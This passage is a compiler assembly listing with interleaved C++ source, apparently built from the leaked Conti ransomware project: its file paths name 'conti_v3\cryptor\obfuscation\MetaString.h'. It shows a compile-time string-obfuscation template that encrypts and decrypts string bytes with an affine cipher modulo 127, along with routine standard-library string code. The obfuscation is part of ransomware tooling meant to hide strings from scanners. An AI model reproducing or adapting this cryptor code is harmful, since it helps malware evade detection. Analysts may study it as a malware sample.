  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 65	 sub	 eax, 101		; 00000065H
  0002d	6b c0 f5	 imul	 eax, eax, -11
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 17	 imul	 eax, eax, 23
  0002d	83 c0 65	 add	 eax, 101		; 00000065H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 06	 cmp	 QWORD PTR i$1[rbp], 6
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv140 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00131	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00135	88 85 c0 00 00
	00		 mov	 BYTE PTR tv140[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0013b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00142	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00149	5f		 pop	 rdi
  0014a	5d		 pop	 rbp
  0014b	c3		 ret	 0
??0?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z
_TEXT	SEGMENT
_Left_size$ = 8
_Right_size$ = 40
$T1 = 260
$T2 = 292
tv86 = 312
__$ReturnUdt$ = 352
_Left$ = 360
_Right$ = 368
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z PROC ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 4968 :     const basic_string<_Elem, _Traits, _Alloc>& _Left, _In_z_ const _Elem* const _Right) {

$LN4:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 88 01
	00 00		 sub	 rsp, 392		; 00000188H
  00018	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4969 :     using _Size_type       = typename basic_string<_Elem, _Traits, _Alloc>::size_type;
; 4970 :     const auto _Left_size  = _Left.size();

  00029	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00030	e8 00 00 00 00	 call	 ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
  00035	48 89 45 08	 mov	 QWORD PTR _Left_size$[rbp], rax

; 4971 :     const auto _Right_size = _Convert_size<_Size_type>(_Traits::length(_Right));

  00039	48 8b 8d 70 01
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00040	e8 00 00 00 00	 call	 ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ; std::_WChar_traits<wchar_t>::length
  00045	48 8b c8	 mov	 rcx, rax
  00048	e8 00 00 00 00	 call	 ??$_Convert_size@_K_K@std@@YA_K_K@Z ; std::_Convert_size<unsigned __int64,unsigned __int64>
  0004d	48 89 45 28	 mov	 QWORD PTR _Right_size$[rbp], rax

; 4972 :     if (_Left.max_size() - _Left_size < _Right_size) {

  00051	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00058	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  0005d	48 2b 45 08	 sub	 rax, QWORD PTR _Left_size$[rbp]
  00061	48 3b 45 28	 cmp	 rax, QWORD PTR _Right_size$[rbp]
  00065	73 05		 jae	 SHORT $LN2@operator

; 4973 :         _Xlen_string();

  00067	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@operator:

; 4974 :     }
; 4975 : 
; 4976 :     return {_String_constructor_concat_tag{}, _Left, _Left.c_str(), _Left_size, _Right, _Right_size};

  0006c	0f b6 85 04 01
	00 00		 movzx	 eax, BYTE PTR $T1[rbp]
  00073	88 85 24 01 00
	00		 mov	 BYTE PTR $T2[rbp], al
  00079	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _Left$[rbp]
  00080	e8 00 00 00 00	 call	 ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
  00085	48 89 85 38 01
	00 00		 mov	 QWORD PTR tv86[rbp], rax
  0008c	48 8b 45 28	 mov	 rax, QWORD PTR _Right_size$[rbp]
  00090	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  00095	48 8b 85 70 01
	00 00		 mov	 rax, QWORD PTR _Right$[rbp]
  0009c	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  000a1	48 8b 45 08	 mov	 rax, QWORD PTR _Left_size$[rbp]
  000a5	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  000aa	4c 8b 8d 38 01
	00 00		 mov	 r9, QWORD PTR tv86[rbp]
  000b1	4c 8b 85 68 01
	00 00		 mov	 r8, QWORD PTR _Left$[rbp]
  000b8	0f b6 95 24 01
	00 00		 movzx	 edx, BYTE PTR $T2[rbp]
  000bf	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR __$ReturnUdt$[rbp]
  000c6	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000cb	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR __$ReturnUdt$[rbp]

; 4977 : }

  000d2	48 8d a5 48 01
	00 00		 lea	 rsp, QWORD PTR [rbp+328]
  000d9	5f		 pop	 rdi
  000da	5d		 pop	 rbp
  000db	c3		 ret	 0
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z ENDP ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 24	 sub	 eax, 36			; 00000024H
  0002d	6b c0 e8	 imul	 eax, eax, -24
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 25	 imul	 eax, eax, 37		; 00000025H
  0002d	83 c0 24	 add	 eax, 36			; 00000024H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 04	 cmp	 QWORD PTR i$1[rbp], 4
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
